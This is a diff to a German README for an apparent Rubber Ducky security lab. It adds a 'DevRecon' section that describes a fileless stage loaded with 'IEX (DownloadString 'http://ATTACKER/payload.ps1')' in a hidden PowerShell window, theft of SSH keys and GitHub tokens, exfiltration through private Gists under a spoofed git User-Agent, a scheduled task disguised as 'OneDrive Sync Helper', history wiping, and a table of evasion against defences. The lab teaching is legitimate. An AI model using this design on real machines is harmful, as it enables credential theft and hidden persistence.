@@ -13,9 +13,11 @@
 | `payloads/W02a4_script_loader.txt` | W02a.4 – DuckyScript: Externes Script laden & ausführen |
 | `payloads/W02a5_reverse_shell_trigger.txt` | W02a.5 – DuckyScript: Reverse Shell triggern |
 | `payloads/W02a6_custom_attack.txt` | W02a.6 – DuckyScript: Eigener Angriff (WLAN-Exfiltration) |
+| `payloads/W02a6_devrecon_trigger.txt` | W02a.6 Advanced – **DevRecon** Trigger (fileless Stage 1) |
 | `scripts/info_gather.ps1` | W02a.2 – PowerShell Payload (wird vom Server gehostet) |
 | `scripts/reverse_shell.ps1` | W02a.5 – PowerShell Reverse Shell (wird vom Server gehostet) |
 | `scripts/custom_attack.ps1` | W02a.6 – PowerShell WLAN-Exfiltration Payload |
+| `scripts/developer_recon.ps1` | W02a.6 Advanced – **DevRecon** Multi-Stage Payload (Stage 2) |
 | `server/server.py` | W02a.2/4/5/6 – Lokaler HTTP-Server (Angreifer-Seite) |
 
 ---
@@ -297,8 +299,100 @@ Verhindert, dass neue/unbekannte Prozesse gestartet werden. Blockiert z.B. den D
 | W02a.4 Script Loader | | | |
 | W02a.5 Reverse Shell | | | |
 | W02a.6 Custom Attack | | | |
+| W02a.6 DevRecon | | | |
 
 **Allgemeine Feststellungen:**
 - Trellix Endpoint Security: Hat während der Übungen angeschlagen? (Ja/Nein)
 - Sprachprobleme (Y/Z): Wurden die Compiler-Settings auf `de` gesetzt?
 - Netzwerk-Erreichbarkeit: War der Python-Server im Labor-LAN erreichbar?
+
+---
+
+## W02a.6 Advanced – "DevRecon" – Multi-Stage Developer Credential Harvester
+
+> Eigener kreativer Angriff: Kombiniert Stealth, Living-off-the-Land, kreatives Angriffsziel und Persistenz in einem vollautomatischen Multi-Stage-Angriff.
+
+**Dateien:**
+- `payloads/W02a6_devrecon_trigger.txt` – Stage 1: DuckyScript
+- `scripts/developer_recon.ps1` – Stage 2: PowerShell Payload
+
+### Angriffsziel
+
+Entwickler-Maschinen sind ein besonders lohnendes Ziel, weil sie oft folgendes enthalten:
+- **SSH Private Keys** (`~/.ssh/id_rsa`, `id_ed25519`, ...) → direkter Zugang zu Servern
+- **`.git-credentials`** → GitHub/GitLab OAuth-Tokens im **Klartext** (Windows speichert sie so standardmäßig)
+- **GitHub CLI Token** (`hosts.yml`) → vollständiger API-Zugriff auf alle Repos des Opfers
+- **`.gitconfig`** → Name, E-Mail, konfigurierter Credential Helper
+
+Ein einziger GitHub-Token kann tausende private Repositories, CI/CD-Pipelines und Produktionsdeploys kompromittieren.
+
+### Angriffs-Architektur
+
+```
+[Rubber Ducky eingesteckt]
+        │
+        ▼  ~2 Sekunden
+[Stage 1: DuckyScript]
+  WIN+R → PowerShell -WindowStyle Hidden
+  IEX (DownloadString 'http://ATTACKER/payload.ps1')
+        │
+        ▼  fileless – kein Byte auf Festplatte
+[Stage 2: developer_recon.ps1]
+        │
+        ├─► RECON: SSH Keys + .git-credentials + .gitconfig + gh-Token
+        │
+        ├─► EXFIL: Privates GitHub Gist (HTTPS → api.github.com:443)
+        │          User-Agent: "git/2.40.0" → sieht aus wie normaler git push
+        │
+        ├─► PERSIST: Scheduled Task "OneDrive Sync Helper"
+        │            Wöchentlich, versteckt, kein Admin nötig
+        │
+        └─► OPSEC: PS-History löschen, Recent Files clearen, Temp aufräumen
+```
+
+### Warum GitHub Gist als Exfil-Kanal?
+
+| Eigenschaft | Vorteil |
+|---|---|
+| Traffic zu `api.github.com:443` | Überall erlaubt – GitHub ist auf keiner Blocklist |
+| HTTPS | Verschlüsselt, kein MitM durch Netzwerk-Monitoring |
+| Privates Gist | Nur Angreifer mit PAT kann die Daten sehen |
+| User-Agent `git/2.40.0` | Tarnung als normaler git-Client im Netzwerk-Log |
+| Keine eigene Infrastruktur | Kein C2-Server nötig, keine verdächtige IP |
+
+### Voraussetzung (Angreifer-Seite)
+
+```bash
+# 1. GitHub Personal Access Token mit "gist"-Scope erstellen:
+#    github.com → Settings → Developer Settings → Personal Access Tokens → New Token
+#    Scope: gist
+
+# 2. PAT in developer_recon.ps1 eintragen:
+$GITHUB_PAT = "ghp_XXXXXXXXXXXXXXXXXXXX"
+
+# 3. Script als payload.ps1 auf dem Python-Server hosten:
+cp scripts/developer_recon.ps1 server/payload.ps1
+python3 server/server.py 8080
+```
+
+### OPSEC-Maßnahmen im Detail
+
+| Maßnahme | Umsetzung |
+|---|---|
+| Fileless Execution | IEX lädt Payload direkt in RAM, keine Datei geschrieben |
+| Verstecktes Fenster | `-WindowStyle Hidden -NonInteractive` |
+| PS-History löschen | PSReadLine-Datei + In-Memory-History geleert |
+| Recent Files clearen | `%APPDATA%\Microsoft\Windows\Recent\*` gelöscht |
+| Scheduled Task getarnt | Name: "OneDrive Sync Helper", `Hidden = $true` |
+| User-Agent Spoofing | HTTP-Header imitiert normalen git-Client |
+
+### Gegen welche Abwehrmaßnahmen ist DevRecon resistent?
+
+| Abwehr | Resistent? | Warum |
+|---|---|---|
+| Antivirus (Signatur-basiert) | ✓ | Kein Binary, nur PS + Windows-Bordmittel |
+| Firewall (eingehend) | ✓ | Keine eingehende Verbindung nötig |
+| Firewall (ausgehend) | ✓ | Traffic zu github.com:443 überall erlaubt |
+| EDR (Verhaltens-basiert) | ~ | Könnte `IEX` + `-ep Bypass` flaggen |
+| PS Script Block Logging | ~ | Logs werden nach Ausführung geleert |
+| Netzwerk-Monitoring | ✓ | Sieht aus wie normaler GitHub-Traffic |
